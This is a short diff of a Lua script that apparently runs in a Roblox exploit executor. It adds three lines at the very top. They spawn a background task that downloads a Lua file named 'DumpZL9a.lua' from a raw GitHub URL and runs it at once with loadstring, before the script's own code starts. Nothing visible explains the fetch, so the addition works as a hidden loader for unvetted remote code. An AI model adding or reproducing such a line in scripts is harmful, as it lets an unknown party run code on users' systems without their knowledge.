@@ -1,3 +1,6 @@
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealAvrwm/Wasteland/refs/heads/main/DumpZL9a.lua", true))()
+    end)
 local zephyrOk, zephyrErr = pcall(function()
     local function getGlobalEnv()
         if type(getgenv) == "function" then
